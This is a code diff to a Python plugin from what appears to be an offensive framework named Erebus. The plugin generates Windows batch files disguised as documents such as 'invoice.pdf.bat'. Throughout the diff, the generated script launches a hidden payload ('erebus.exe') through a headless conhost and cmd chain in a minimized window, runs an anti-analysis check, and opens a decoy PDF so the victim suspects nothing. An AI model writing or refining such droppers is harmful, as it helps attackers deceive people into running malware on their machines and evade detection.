@@ -24,7 +24,7 @@ class BatTriggerPlugin(ErebusPlugin):
     decoy files. This plugin creates BAT triggers with anti-analysis features
     and minimized execution windows.
     """
-    
+
     def __init__(self):
         """Initialize the BAT trigger plugin"""
         super().__init__()
@@ -32,7 +32,7 @@ class BatTriggerPlugin(ErebusPlugin):
         self.AGENT_CODE = self.REPO_ROOT / "agent_code"
         self.PAYLOAD_DIR = self.AGENT_CODE / "payload"
         self.DECOY_FILE = self.AGENT_CODE / "decoys" / "decoy.pdf"
-    
+
     def get_metadata(self) -> PluginMetadata:
         """Return plugin metadata"""
         return PluginMetadata(
@@ -43,7 +43,7 @@ class BatTriggerPlugin(ErebusPlugin):
             category=PluginCategory.TRIGGER,
             enabled=True
         )
-    
+
     def register(self) -> Dict[str, Callable]:
         """Register the functions this plugin provides"""
         return {
@@ -60,32 +60,34 @@ class BatTriggerPlugin(ErebusPlugin):
             return (True, None)
         except Exception as e:
             return (False, f"Validation error: {e}")
-    
+
     def on_load(self):
         """Called when plugin is loaded"""
         print(f"[Plugin] BAT Trigger plugin loaded - Supporting batch script creation")
-    
+
     # ==================== Plugin Functions ====================
-    
+
     def create_bat_trigger(
         self,
-        payload_exe: str,
+        target_bin: str,
+        args: str,
         decoy_file: str,
         payload_dir: Optional[pathlib.Path] = None,
-        output_filename: str = "invoice.pdf.bat"
+        output_filename: Optional[str] = None
     ) -> pathlib.Path:
         """
         Create a BAT trigger file in the payloads directory.
-        
+
         Args:
-            payload_exe: Name of the payload executable (e.g., "erebus.exe")
+            target_bin: Binary to execute (e.g., "C:\\Windows\\System32\\conhost.exe")
+            args: Command arguments (e.g., "--headless cmd.exe /Q /c erebus.exe | decoy.pdf")
             decoy_file: Name of the decoy file (e.g., "decoy.pdf")
             payload_dir: Directory where payload files are stored (uses default if None)
-            output_filename: Output BAT filename (default: "invoice.pdf.bat")
-        
+            output_filename: Output BAT filename (default: auto-generated from decoy_file)
+
         Returns:
             pathlib.Path: Path to the created BAT file
-            
+
         Raises:
             RuntimeError: If BAT creation fails
         """
@@ -93,15 +95,19 @@ class BatTriggerPlugin(ErebusPlugin):
             if payload_dir is None:
                 payload_dir = self.PAYLOAD_DIR
 
+            # Auto-generate output filename based on decoy file if not provided
+            if output_filename is None:
+                output_filename = f"{decoy_file}.bat"
+
             bat_output_path = payload_dir / output_filename
-            payload_exe_win = str(payload_exe).replace('/', '\\')
+            target_bin_win = str(target_bin).replace('/', '\\')
             decoy_file_win = str(decoy_file).replace('/', '\\')
 
             # Build BAT content with anti-analysis checks
             bat_content = []
             bat_content.append("@echo off")
             bat_content.append('echo %cmdcmdline% | find /i "%~f0" >nul || exit')
-            bat_content.append(f'start "" /min "{payload_exe_win}" >nul 2>&1')
+            bat_content.append(f'start "" /min "{target_bin_win}" {args} >nul 2>&1')
             bat_content.append(f'start "" "{decoy_file_win}"')
             bat_content.append("exit")
 
@@ -110,30 +116,33 @@ class BatTriggerPlugin(ErebusPlugin):
                 f.write('\n'.join(bat_content))
 
             return bat_output_path
-            
+
         except Exception as e:
             raise RuntimeError(f"BAT trigger creation failed: {e}")
-    
+
     def create_bat_payload_trigger(
         self,
-        payload_exe: str = "erebus.exe",
+        target_bin: str = "C:\\Windows\\System32\\conhost.exe",
+        args: str = "--headless cmd.exe /Q /c erebus.exe | decoy.pdf",
         payload_dir: Optional[pathlib.Path] = None,
         decoy_file: Optional[pathlib.Path] = None,
     ) -> pathlib.Path:
         """
-        Create BAT payload trigger with default settings.
-        
-        Simplified wrapper that uses default decoy file and creates
-        a BAT trigger for the specified payload.
-        
+        Create BAT payload trigger with builder.py parameter compatibility.
+
+        Uses the same parameter names as builder.py:
+        - target_bin: Maps to builder.py parameter "0.8 Trigger Binary"
+        - args: Maps to builder.py parameter "0.9 Trigger Command"
+
         Args:
-            payload_exe: Name of the payload executable (default: "erebus.exe")
+            target_bin: Binary to execute (default: "C:\\Windows\\System32\\conhost.exe")
+            args: Command arguments (default: "--headless cmd.exe /Q /c erebus.exe | decoy.pdf")
             payload_dir: Directory where payload files are stored (uses default if None)
             decoy_file: Path to decoy file (uses default if None)
-        
+
         Returns:
             pathlib.Path: Path to the created BAT file
-            
+
         Raises:
             RuntimeError: If trigger creation fails
         """
@@ -144,11 +153,12 @@ class BatTriggerPlugin(ErebusPlugin):
             decoy_filename = decoy_file.name
 
             return self.create_bat_trigger(
-                payload_exe=payload_exe,
+                target_bin=target_bin,
+                args=args,
                 decoy_file=decoy_filename,
                 payload_dir=payload_dir
             )
-            
+
         except Exception as e:
             raise RuntimeError(f"BAT payload trigger creation failed: {e}")
 
@@ -161,7 +171,7 @@ if __name__ == "__main__":
     print(f"[*] Category: {_metadata.category.value}")
     print(f"[*] Description: {_metadata.description}")
     print()
-    
+
     # Display all registered functions
     registered = _plugin.register()
     registered_names = sorted(registered.keys()) if registered else []
@@ -169,7 +179,7 @@ if __name__ == "__main__":
     for func_name in registered_names:
         print(f"    - {func_name}")
     print()
-    
+
     is_valid, error = _plugin.validate()
     if is_valid:
         print("[+] Validation passed")
